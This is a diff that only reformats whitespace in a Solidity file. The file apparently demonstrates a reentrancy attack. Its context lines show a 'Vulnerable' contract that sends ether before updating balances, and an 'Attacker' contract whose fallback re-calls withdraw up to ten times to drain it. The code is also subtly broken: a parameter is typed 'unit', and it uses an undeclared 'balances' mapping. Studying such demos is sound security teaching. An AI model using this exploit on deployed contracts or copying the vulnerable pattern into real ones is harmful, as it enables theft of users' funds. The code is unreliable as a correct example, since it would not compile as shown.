@@ -3,7 +3,7 @@ pragma solidity ^0.4.18;
 contract Vulnerable{
   mapping (address => uint) private userBalances;
   mapping (address => uint) private rewardsForA;
-  uint public totalbalance=0;
+  uint public totalbalance = 0;
 
   function createUser() payable{ 
      rewardsForA[msg.sender] += msg.value;         
@@ -11,7 +11,7 @@ contract Vulnerable{
 
   function addToBalance() payable{ 
      userBalances[msg.sender] += msg.value; 
-     totalbalance+= msg.value;
+     totalbalance += msg.value;
   } 
 
   // Each recipient should only be able to claim the bonus once
@@ -21,13 +21,13 @@ contract Vulnerable{
       if (recipient.call.value(amountToWithdraw)() == false) {
               throw;
       }
-      totalbalance-= amountToWithdraw;
+      totalbalance -= amountToWithdraw;
   }
 
   function withdraw(unit _amount) public {   
     msg.sender.call.value(_amount)();
-    balances[msg.sender]-=_amount;
-    totalbalance-= _amount;
+    balances[msg.sender] -=_amount;
+    totalbalance -= _amount;
   }
 }
 
@@ -39,8 +39,8 @@ contract Attacker{
 
   //initial the attack contract with the vulnerable address
   function Attacker(address _vulAddr){ 
-     _owner=msg.sender;
-     vul=_vulAddr;
+     _owner = msg.sender;
+     vul = _vulAddr;
   }
 
   function attack(){
@@ -49,7 +49,7 @@ contract Attacker{
 
   function () payable{
      count++;
-     if(count<10){
+     if(count < 10){
        vul.withdraw(1 ether);
      }
   }
